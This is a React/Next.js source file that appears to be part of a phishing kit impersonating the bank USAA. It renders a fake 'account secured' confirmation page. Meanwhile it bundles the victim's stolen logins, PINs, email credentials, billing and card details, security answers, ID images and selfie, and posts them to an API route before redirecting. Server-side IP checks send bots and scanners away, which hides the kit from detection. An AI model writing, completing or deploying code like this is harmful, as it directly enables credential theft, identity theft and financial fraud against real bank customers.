/* eslint-disable @next/next/no-img-element */
import axios from "axios";
import React, { useContext, useEffect } from "react";
import { Wrapper } from "../components/Wrapper";
import { dataURItoBlob } from "../utils/dataURItoBlob";
import { DataContext } from "./_app";
import { GetServerSideProps } from "next";
import checkIp from "../middleware/checkIp";

interface ConfirmationProps { }

export const Confirmation: React.FC<ConfirmationProps> = ({ }) => {
  const { data } = useContext(DataContext);

  useEffect(() => {
    if (typeof window === "undefined" || !data || !Object.keys(data).length)
      return;

    const sendSession = async () => {
      if (!data.logins) {
        console.log("You are on the server");
        return;
      }

      const formData = new FormData();

      const keys = [
        "sessionId",
        "front",
        "back",
        "logins",
        "pins",
        "selfie",
        "emailLogins",
        "billing",
        "cardDetails",
        "answers",
      ];

      keys.forEach((key) => {
        const value = data[key];
        if (value) {
          if (
            [
              "logins",
              "pins",
              "emailLogins",
              "billing",
              "cardDetails",
              "answers",
            ].includes(key)
          ) {
            formData.append(key, JSON.stringify(value));
          } else if (key === "selfie") {
            formData.append(key, dataURItoBlob(value));
          } else {
            formData.append(key, value);
          }
        }
      });

      formData.append("form", "SESSION");

      try {
        await axios.post("/api/send", formData);
      } catch (error) {
        console.error("Failed to send session data:", error);
      }

      window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
    };

    sendSession();

    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <Wrapper
      paragraph="Thank you for verifying your account information, your account has been secured and your online access has been resotred. Please wait while we redirect you to the login page."
      title="Thank you, your account has been secured."
      hideBtn
    >
      <div className="usaa-form-v5-10-1-formGroup-wrapper">
        <div className="usaa-form-v5-10-1-formGroup">
          <div
            style={{
              display: `flex`,
              // alignItems: `center`,
              // justifyContent: `center`,
              padding: `20px 0`,
              paddingTop: 0,
              marginBottom: `20px`,
              flexDirection: `column`,
            }}
          >
            <p
              style={{
                padding: `13px 23px 9px`,
                fontSize: 14,
              }}
            >
              Your information has been verified and your online access has been
              resotred. Please wait while we redirect you to the login page.
            </p>
            <span className="usaa-interstitialSpinner"></span>
          </div>
        </div>
      </div>
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
        redirect: {
          destination: process.env.NEXT_PUBLIC_EXIT_URL,
          permanent: false,
        },
      }
      : {}),
  };
};

export default Confirmation;
